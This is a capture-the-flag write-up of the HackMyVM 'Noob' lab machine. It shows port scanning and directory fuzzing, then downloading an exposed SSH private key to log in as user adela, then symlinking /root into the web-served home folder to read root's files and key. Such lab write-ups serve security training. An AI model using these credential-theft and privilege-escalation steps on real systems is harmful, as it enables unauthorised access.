# **Noob :: HackMyVM**

***
![image](https://github.com/user-attachments/assets/38cc8183-6833-4df3-95e0-e692a058620c)


## **Difficulty :: Easy**

***

Running our nmap scan we have 2 open ports

```bash
# Nmap 7.94SVN scan initiated Thu Oct 17 22:07:24 2024 as: /usr/lib/nmap/nmap --privileged -p- -T4 -v -sCV -oN nmap.txt 192.168.0.200
Nmap scan report for noob (192.168.0.200)
Host is up (0.00022s latency).
Not shown: 65533 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 66:6a:8e:22:cd:dd:75:52:a6:0a:46:06:bc:df:53:0f (RSA)
|   256 c2:48:46:33:d4:fa:c0:e7:df:de:54:71:58:89:36:e8 (ECDSA)
|_  256 5e:50:90:71:08:5a:88:62:7e:81:07:c3:9a:c1:c1:c6 (ED25519)
65530/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
MAC Address: 08:00:27:44:46:EE (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Oct 17 22:07:37 2024 -- 1 IP address (1 host up) scanned in 13.98 seconds
```



As shown above in our nmap scan it looks like the website on port 65530/HTTP is hosting a web server and is probably serving files, Making a `curl`


```bash
❯ curl http://192.168.0.200:65530
404 page not found
```

Performing directory fuzzing i found two web directories


```bash
❯ ffuf -ic -u "http://192.168.0.200:65530/FUZZ" -w /usr/share/wordlists/seclist/Discovery/Web-Content/directory-list-2.3-medium.txt -fc 404,403,401 -e .log,.txt,.zip,.php,.bak,.sql,.pdf,.png
,.jpg,.jpeg,.html,.conf,..git

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.0.200:65530/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclist/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .log .txt .zip .php .bak .sql .pdf .png .jpg .jpeg .html .conf ..git 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500          
 :: Filter           : Response status: 404,403,401
________________________________________________ 


index                   [Status: 200, Size: 19, Words: 4, Lines: 2, Duration: 6ms]   
nt4share                [Status: 301, Size: 45, Words: 3, Lines: 3, Duration: 0ms]
```


Checking the `nt4share` web directory we have few files that are meant to be on a linux home directory


![](https://i.imgur.com/4L6nRTK.png)

We can go ahead and download the `id_rsa` file in the `.ssh` directory 


```bash
❯ wget http://192.168.0.200:65530/nt4share/.ssh/id_rsa
```



Then grant the file `rw` permissions and login as user `adela` as discovered in the `id_rsa.pub` file in the `.ssh` directory


```bash
❯ chmod 600 id_rsa

❯ ssh adela@192.168.0.200 -i id_rsa
The authenticity of host '192.168.0.200 (192.168.0.200)' can't be established.
ED25519 key fingerprint is SHA256:0ug88klEB+Auk3kP/jhWOHJJZmKXY2RjjR4GnhZdYuQ.
--SNIP--
adela@noob:~$ 
```

Checking our current user home folder we don't have anything interesting

```bash
adela@noob:~$ ls -la
total 32
drwxr-xr-x 4 adela adela 4096 Oct 18 02:48 .
drwxr-xr-x 3 root  root  4096 Jul 11  2021 ..
-rw-r--r-- 1 adela adela  220 Jul 11  2021 .bash_logout
-rw-r--r-- 1 adela adela 3526 Jul 11  2021 .bashrc
drwxr-xr-x 3 adela adela 4096 Oct 18 02:28 .local
-rw-r--r-- 1 adela adela  807 Jul 11  2021 .profile
drwx------ 2 adela adela 4096 Oct 18 02:27 .ssh
-rw------- 1 adela adela   50 Jul 14  2021 .Xauthority
adela@noob:~$
```


Tried searching for the `nt4share` directory if it is been hosted locally but to my surprise, It is not 😢


```bash
adela@noob:~$ find / -name "*nt4share*" 2>/dev/null
```


Well since files are currently been hosted from our current user home folder we can go ahead and create a symbolic link to the  `/root` directory as shown below


```bash
adela@noob:~$ ln -s /root root
adela@noob:~$ ls -l
total 0
lrwxrwxrwx 1 adela adela 5 Oct 18 02:49 root -> /root
adela@noob:~$ 
```



Then access it from the web endpoint, we can also go ahead and grab the `root` user `id_rsa` file and login or just submit flags


![](https://i.imgur.com/hVSYG16.png)


<button onclick="window.location.href='https://sec-fortress.github.io';">Back To Home螥</button>
